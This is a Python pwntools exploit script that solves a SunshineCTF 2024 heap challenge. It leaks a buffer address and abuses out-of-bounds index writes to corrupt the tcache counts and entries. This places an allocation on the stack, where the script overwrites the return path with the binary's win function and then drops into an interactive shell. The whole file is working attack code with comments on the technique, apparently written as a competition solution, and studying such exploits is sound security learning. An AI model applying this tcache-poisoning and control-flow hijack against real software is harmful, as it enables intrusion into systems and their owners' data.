#!/usr/bin/env python3

from pwn import *

exe = ELF("./heap01_patched")
libc = ELF("./libc_chall.so", checksec = False)
ld = ELF("./ld-2.35.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("2024.sunshinectf.games", 24006)

    return r


# Similar (in some way) to this : https://maxwelldulin.com/BlogPost/House-of-IO-Heap-Reuse
def main():
    r = conn()

    r.sendlineafter(b"leak? ", b"y")
    buf_addr = int(r.recvlines(2)[-1].strip(), 16)
    log.info(f"buffer @ 0x{buf_addr:x}")

    # Allocate a 0x20-size chunk
    r.sendlineafter(b"size: ", f"{0x18}".encode("ascii"))

    """
    Allocated chunk | PREV_INUSE
    Addr: 0x10b9000     <---------- Thread TCache
    Size: 0x291

    Allocated chunk | PREV_INUSE
    Addr: 0x10b9290     <---------- `fgets()` chunk for reads
    Size: 0x1011

    Allocated chunk | PREV_INUSE
    Addr: 0x10ba2a0     <---------- First allocated chunk
    Size: 0x21

    Top chunk | PREV_INUSE
    Addr: 0x10ba2c0     <---------- Top Chunk
    Size: 0x1fd41
    """

    # Overwrite counts[0] (for size 0x20) to 1 so program belives that
    # there is one chunk in the bin
    r.sendlineafter(b"Index: ", f"-{(0x12a0 // 8)}".encode("ascii"))
    r.sendlineafter(b"Value: ", f"{0x1}".encode("ascii"))

    # Overwrite entries[0] (for size 0x20) to an arbitrary address so
    # the next allocation will be (from the bin) to that address
    r.sendlineafter(b"Index: ", f"-{(0x12a0 // 8) - 16}".encode("ascii"))
    r.sendlineafter(b"Value: ", f"{buf_addr + 0x20}".encode("ascii"))

    # Now that the second chunk is on the stack, we can overwrite values there
    r.sendlineafter(b"Value 1: ", b"1")
    r.sendlineafter(b"Value 2 - ", f"{exe.sym.main + 74}".encode("ascii"))  # Align stack for xmm instruction
    r.sendlineafter(b"Value 3 -> ", f"{exe.sym.win}".encode("ascii"))

    r.interactive("$ ")


if __name__ == "__main__":
    main()
